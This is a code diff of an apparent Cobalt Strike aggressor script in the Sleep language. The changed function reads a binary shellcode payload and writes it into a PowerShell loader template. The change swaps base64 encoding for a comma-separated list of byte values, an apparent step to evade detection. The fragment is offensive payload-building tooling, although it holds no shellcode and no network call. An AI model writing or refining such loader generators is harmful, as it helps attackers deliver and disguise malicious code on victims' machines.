@@ -20,20 +20,26 @@ global('$new_strs');
 sub payload_bin_to_ps1 {
 	$in = openf($bin_path);
 	$data = readb($in, -1);
-	$b64 = base64_encode($data);
+
+	for ($x = 0; $x < strlen($data); $x++)
+	{
+		$shellcode = (byteAt($data, $x) . ",");
+		$char_code = $char_code.$shellcode;
+	}
+	$char_code = left($char_code, int(strlen($char_code)) - 1);
 	$org_file = $path.'\\powershell_load.ps1';
 	$handle = openf($org_file);
-	setEncoding($handle, "UTF-8");
-	while $text (readln($handle)){
-		$rep = replace($text, 'base64', $b64)."\n";
+	while $text (readln($handle)){ 
+		$rep = replace($text, 'acode.*=.*', 'acode='.$char_code)."\n";
 		$new_strs = $new_strs.$rep;
 	}
-	$filestring = right($new_strs, int(strlen($new_strs)));
+	$filestring = right($new_strs, int(strlen($new_strs)) - 1);
 	$out =  openf(">$payload_file_ps1");
 	writeb($out, $filestring);
 	closef($out);
 	closef($in);
 	$new_strs = '';
+	$char_code = '';
 	
 }
 
